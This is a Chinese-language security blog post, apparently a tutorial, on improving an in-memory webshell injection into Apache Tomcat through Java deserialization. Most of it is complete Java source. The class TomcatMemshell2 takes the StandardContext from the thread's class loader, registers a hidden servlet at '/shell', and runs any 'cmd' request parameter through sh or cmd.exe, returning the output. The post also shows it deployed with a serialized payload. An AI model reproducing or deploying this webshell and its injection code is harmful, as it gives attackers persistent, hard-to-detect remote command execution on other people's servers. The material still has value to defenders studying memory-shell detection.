## 前言

这一篇主要是对前面一篇中如何注入内存马的方式做出一小部分的优化

## 正文

### 回顾

在上一篇中，主要是通过寻找到了在`org.apache.coyote.AbstractProcessor`类中存在有`request /
response`两个属性值，并且能够从当前线程中一步一步获取到该类的属性值，从而做到了中间件的回显

而对于内存马的实现，我采用的思路是在获取到了`org.apache.coyote.Request`对象之后，通过调用`getNode(1)`来进行`org.apache.catelina.connector.Request`对象的获取

![image-20221103200357612.png](https://image.3001.net/images/20221124/1669258397_637edc9d568f5fdc93e13.png!small)

之后在获取了`HttpServleetRequest`类对象之后，通过调用他的`getServletContext`方法来获取到`ServletContext`对象

![image-20221103200527214.png](https://image.3001.net/images/20221124/1669258404_637edca40c450e2a9f24b.png!small)

之后就是常规的获取`StandardContext`对象之后通过调用`addChild /
addServletMappingDecoded`来进行Servlet的动态创建

    
    
    try {
                // 从线程中获取类加载器WebappClassLoaderBase
                WebappClassLoaderBase contextClassLoader = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
                // 获取TomcatEmbeddedContext对象
                Context context = contextClassLoader.getResources().getContext();
                // 从上下文中获取ApplicationContext对象
                ApplicationContext applicationContext = (ApplicationContext) getField(context, Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context"));
    
                // 从Application中获取StandardService对象
                StandardService standardService = (StandardService) getField(applicationContext, Class.forName("org.apache.catalina.core.ApplicationContext").getDeclaredField("service"));
    
                // 从StandardService中获取Connector数组
                Connector[] connectors = standardService.findConnectors();
                for (Connector connector : connectors) {
                    if (connector.getScheme().toLowerCase().contains("http")) {
                        // 获取Connector对象的protocolHandler属性值
                        ProtocolHandler protocolHandler = connector.getProtocolHandler();
                        // 筛选我们需要的Abstract
                        if (protocolHandler instanceof AbstractProtocol) {
                            // 从Http11NioProtocol对象中获取到handler属性，也即是AbstractProtocol中的handler属性，存在有一个getHandler方法可以直接返回
                            // 反射获取该方法
                            Method getHandler = Class.forName("org.apache.coyote.AbstractProtocol").getDeclaredMethod("getHandler");
                            getHandler.setAccessible(true);
                            AbstractEndpoint.Handler handler = (AbstractEndpoint.Handler) getHandler.invoke(protocolHandler);
                            // 从上面获取的handler中取出global属性值
                            RequestGroupInfo global = (RequestGroupInfo) getField(handler, Class.forName("org.apache.coyote.AbstractProtocol$ConnectionHandler").getDeclaredField("global"));
                            // 之后从上面获取的RequestGroupInfo对象中获取到processors这个List对象，元素是RequestInfo对象
                            ArrayList processors = (ArrayList) getField(global, Class.forName("org.apache.coyote.RequestGroupInfo").getDeclaredField("processors"));
                            // 遍历List中的元素
                            for (Object processor : processors) {
                                RequestInfo requestInfo = (RequestInfo) processor;
                                // 获取对应的Request对象
                                org.apache.coyote.Request req = (org.apache.coyote.Request) getField(requestInfo, Class.forName("org.apache.coyote.RequestInfo").getDeclaredField("req"));
                                org.apache.catalina.connector.Request request = (org.apache.catalina.connector.Request) req.getNote(1);
    
                                ServletContext servletContext = request.getServletContext();
    
                                String name = "RoboTerh";
                                if (servletContext.getServletRegistration(name) == null) {
                                    StandardContext o = null;
    
                                    // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
                                    while (o == null) {
                                        Field f = servletContext.getClass().getDeclaredField("context");
                                        f.setAccessible(true);
                                        Object object = f.get(servletContext);
    
                                        if (object instanceof ServletContext) {
                                            servletContext = (ServletContext) object;
                                        } else if (object instanceof StandardContext) {
                                            o = (StandardContext) object;
                                        }
                                    }
    
                                    //自定义servlet
                                    Servlet servlet = new TomcatMemshell1();
    
                                    //用Wrapper封装servlet
                                    Wrapper newWrapper = o.createWrapper();
                                    newWrapper.setName(name);
                                    newWrapper.setLoadOnStartup(1);
                                    newWrapper.setServlet(servlet);
    
                                    //向children中添加Wrapper
                                    o.addChild(newWrapper);
                                    //添加servlet的映射
                                    o.addServletMappingDecoded("/shell", name);
    
                                }
                            }
                        }
                    }
                }
    

### 修改

但是我们这里的目的不是中间件的回显，而是找到注入内存马的通用思路，我们只需要获取到一个Context上下文对象就能够成功注入到内存马

我们直接可以通过从当前线程中获取到`ApplicationContext`这个上下文对象，直接进行后续的动态创建Servlet的操作，完全没必要获取到request对象之后在进行处理之后进行注入

修改后的代码

    
    
    package pers.cc;
    
    import com.sun.org.apache.xalan.internal.xsltc.DOM;
    import com.sun.org.apache.xalan.internal.xsltc.TransletException;
    import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
    import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
    import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
    import org.apache.catalina.Context;
    import org.apache.catalina.Wrapper;
    import org.apache.catalina.core.ApplicationContext;
    import org.apache.catalina.core.StandardContext;
    import org.apache.catalina.loader.WebappClassLoaderBase;
    
    import javax.servlet.*;
    import java.io.IOException;
    import java.io.InputStream;
    import java.io.PrintWriter;
    import java.lang.reflect.Field;
    import java.util.Scanner;
    
    public class TomcatMemshell2 extends AbstractTranslet implements Servlet{
        @Override
        public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
    
        }
    
        @Override
        public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
    
        }
    
        public static Object getField(Object obj, Field field) {
            try {
                field.setAccessible(true);
                return field.get(obj);
            } catch (Exception e) {
            }
            return null;
        }
    
        static {
            try {
                // 从线程中获取类加载器WebappClassLoaderBase
                WebappClassLoaderBase contextClassLoader = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
                // 获取TomcatEmbeddedContext对象
                Context context = contextClassLoader.getResources().getContext();
                // 从上下文中获取ApplicationContext对象
                ApplicationContext servletContext = (ApplicationContext) getField(context, Class.forName("org.apache.catalina.core.StandardContext").getDeclaredField("context"));
    
                String name = "RoboTerh";
                if (servletContext.getServletRegistration(name) == null) {
                    StandardContext o = null;
    
                    // 从 request 的 ServletContext 对象中循环判断获取 Tomcat StandardContext 对象
                    while (o == null) {
                        Field f = servletContext.getClass().getDeclaredField("context");
                        f.setAccessible(true);
                        Object object = f.get(servletContext);
    
                        if (object instanceof StandardContext) {
                            o = (StandardContext) object;
                        }
                    }
    
                    //自定义servlet
                    Servlet servlet = new TomcatMemshell2();
    
                    //用Wrapper封装servlet
                    Wrapper newWrapper = o.createWrapper();
                    newWrapper.setName(name);
                    newWrapper.setLoadOnStartup(1);
                    newWrapper.setServlet(servlet);
    
                    //向children中添加Wrapper
                    o.addChild(newWrapper);
                    //添加servlet的映射
                    o.addServletMappingDecoded("/shell", name);
    
                }
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    
        @Override
        public void init(ServletConfig servletConfig) throws ServletException {
    
        }
    
        @Override
        public ServletConfig getServletConfig() {
            return null;
        }
    
        @Override
        public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
            String cmd = servletRequest.getParameter("cmd");
            boolean isLinux = true;
            String osTyp = System.getProperty("os.name");
            if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                isLinux = false;
            }
            String[] cmds = isLinux ? new String[]{"sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
            InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
            Scanner s = new Scanner(in).useDelimiter("\\a");
            String output = s.hasNext() ? s.next() : "";
            PrintWriter out = servletResponse.getWriter();
            out.println(output);
            out.flush();
            out.close();
        }
    
        @Override
        public String getServletInfo() {
            return null;
        }
    
        @Override
        public void destroy() {
    
        }
    }
    

### 测试

同样是之前的测试环境

发送序列化数据

![image-20221103201103941.png](https://image.3001.net/images/20221124/1669258423_637edcb78177c7742b637.png!small)

成功执行反序列化的逻辑，没有报错

![image-20221103201141570.png](https://image.3001.net/images/20221124/1669258429_637edcbd7601c8f2c7bf0.png!small)

之后可以验证，成功创建了一个恶意的Servlet

![image-20221103201213084.png](https://image.3001.net/images/20221124/1669258440_637edcc84fd72aca0f83c.png!small)

